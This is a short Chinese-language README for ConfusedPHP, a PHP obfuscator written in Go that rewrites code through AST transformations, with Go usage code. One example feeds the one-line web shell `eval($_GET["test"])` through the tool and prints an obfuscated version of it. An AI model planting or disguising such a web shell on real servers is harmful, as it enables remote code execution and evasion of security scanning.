## ConfusedPHP 
一个开发中的php混淆器. 基于AST等价修改.

目前只添加了7种混淆技术

#### 目前测试效果
```php
<? var_dump(1);
```
```php
<?php
function LVGSc() {
    return call_user_func(qndIy);
}
function qndIy() {
    return 1;
}
call_user_func(call_user_func, call_user_func, var_dump, LVGSc());
```
```php
<? eval($_GET["test"]);
```
```
<?php
function TBVlz() {
    return eval(qlMGB()[base64("InRlc3Qi")]);
}
function qlMGB() {
    return $_GET;
}
call_user_func(TBVlz);
```

### 使用
`go get github.com/blue-bird1/ConfusedPHP`

```go
package main 

import (
	"time"
	"math/rand"
	"os"
	"github.com/blue-bird1/ConfusedPHP"
	"github.com/z7zmey/php-parser/printer"
)

func main(){
var shell = confusedPHP.NewShell("./test.php")
var _ = shell.Parser()
rand.Seed(time.Now().UTC().UnixNano())
n := shell.GetRoot()
editor := confusedPHP.NewEditor(&n)
// 一次调用一次混淆
_ = editor.Edit()
_ = editor.Edit()
var p = printer.NewPrinter(os.Stdout, "    ")
p.Print(*editor.Root)
}
```